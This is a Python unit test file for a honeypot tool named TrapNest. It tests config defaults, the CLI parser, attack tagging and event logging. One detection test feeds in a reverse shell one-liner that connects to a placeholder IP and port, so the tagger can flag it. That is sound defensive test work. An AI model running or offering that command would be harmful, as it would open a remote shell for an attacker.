import unittest

from config import ProjectConfig
from db import save_event, summarize_events
from honeypot import tag
from main import build_parser


class TestTrapNestLauncher(unittest.TestCase):
    def test_default_project_config(self):
        cfg = ProjectConfig()
        self.assertEqual(cfg.host, "127.0.0.1")
        self.assertEqual(cfg.telnet_port, 2323)
        self.assertEqual(cfg.http_port, 8080)
        self.assertEqual(cfg.report_file, "report.html")

    def test_parser_has_demo_command(self):
        parser = build_parser()
        args = parser.parse_args(["demo", "--host", "127.0.0.1"])
        self.assertEqual(args.command, "demo")
        self.assertEqual(args.host, "127.0.0.1")

    def test_detection_has_bruteforce_and_reverse_shell_tags(self):
        self.assertIn("bruteforce", tag("admin admin root"))
        self.assertIn("reverse_shell", tag("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"))

    def test_database_persistence(self):
        db_path = "test_trapnest.db"
        save_event({"ip": "1.2.3.4", "service": "http", "event": "login_attempt", "username": "admin", "password": "pass"}, db_path)
        summary = summarize_events(db_path)
        self.assertEqual(summary["total_events"], 1)
        self.assertEqual(summary["top_ips"][0][0], "1.2.3.4")


if __name__ == "__main__":
    unittest.main()
